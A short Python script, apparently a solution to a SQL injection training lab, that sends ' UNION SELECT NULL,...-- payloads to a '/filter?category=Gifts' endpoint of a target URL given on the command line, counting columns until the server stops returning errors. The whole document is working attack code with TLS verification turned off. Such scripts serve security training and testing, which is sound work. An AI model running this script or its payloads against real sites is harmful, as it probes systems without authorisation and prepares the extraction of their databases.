#!/usr/bin/env python3

import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli_04_columns(url):
    path = "/filter?category=Gifts"
    for i in range(1,50):
        print(f"[+] Testing column count: {i}")

        nulls = ",".join(["NULL"] * i)
        sqli_payload = f"' UNION SELECT {nulls}--"
        r = requests.get(url + path + sqli_payload, verify=False)
        if "Internal Server Error" not in r.text:
            return i
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        sys.exit() 


    col_num = sqli_04_columns(url)
    if col_num:
        print("[+] The number of columns is: " + str(col_num))

    else:
        print("[-] The SQLi was unsuccessful")    